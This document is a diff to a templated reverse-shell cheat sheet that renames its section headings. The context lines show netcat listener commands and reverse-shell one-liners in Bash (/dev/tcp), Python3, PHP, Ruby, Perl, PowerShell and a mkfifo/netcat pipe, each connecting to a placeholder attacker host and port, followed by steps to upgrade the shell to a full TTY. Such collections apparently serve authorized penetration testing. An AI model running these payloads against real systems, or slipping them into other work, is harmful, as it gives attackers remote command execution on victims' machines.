@@ -6,7 +6,7 @@
 
 ---
 
-## Listener Setup (netcat)
+## listener netcat
 Start a netcat listener to catch any of the reverse shells below.
 
 ```bash
@@ -17,7 +17,7 @@ nc -lvnp {{LPORT:port:4444}}
 
 ---
 
-## Listener Setup (rlwrap + netcat)
+## listener netcat rlwrap
 Catch a reverse shell with readline support for arrow keys and history.
 
 ```bash
@@ -28,7 +28,7 @@ rlwrap nc -lvnp {{LPORT:port:4444}}
 
 ---
 
-## Bash Reverse Shell
+## reverse shell bash
 Send a reverse shell using Bash /dev/tcp.
 
 ```bash
@@ -39,7 +39,7 @@ bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1
 
 ---
 
-## Python3 Reverse Shell
+## reverse shell python3
 Send a reverse shell using Python 3.
 
 ```bash
@@ -50,7 +50,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ---
 
-## PHP Reverse Shell
+## reverse shell php
 Send a reverse shell using PHP from the command line.
 
 ```bash
@@ -61,7 +61,7 @@ php -r '$sock=fsockopen("{{LHOST:ip}}",{{LPORT:port:4444}});$proc=proc_open("/bi
 
 ---
 
-## Ruby Reverse Shell
+## reverse shell ruby
 Send a reverse shell using Ruby.
 
 ```bash
@@ -72,7 +72,7 @@ ruby -rsocket -e 'f=TCPSocket.open("{{LHOST:ip}}",{{LPORT:port:4444}}).to_i;exec
 
 ---
 
-## Perl Reverse Shell
+## reverse shell perl
 Send a reverse shell using Perl.
 
 ```bash
@@ -83,7 +83,7 @@ perl -e 'use Socket;$i="{{LHOST:ip}}";$p={{LPORT:port:4444}};socket(S,PF_INET,SO
 
 ---
 
-## PowerShell Reverse Shell
+## reverse shell powershell
 Send a reverse shell using PowerShell (for Windows targets).
 
 ```bash
@@ -94,7 +94,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST:i
 
 ---
 
-## mkfifo + Netcat Reverse Shell
+## reverse shell mkfifo netcat
 Send a reverse shell using a named pipe and netcat (works when bash /dev/tcp is unavailable).
 
 ```bash
@@ -105,7 +105,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:
 
 ---
 
-## Upgrade to Full TTY
+## upgrade tty full
 Upgrade a basic reverse shell to a fully interactive TTY. After spawning, press Ctrl+Z, run `stty raw -echo; fg`, then `export TERM=xterm`.
 
 ```bash
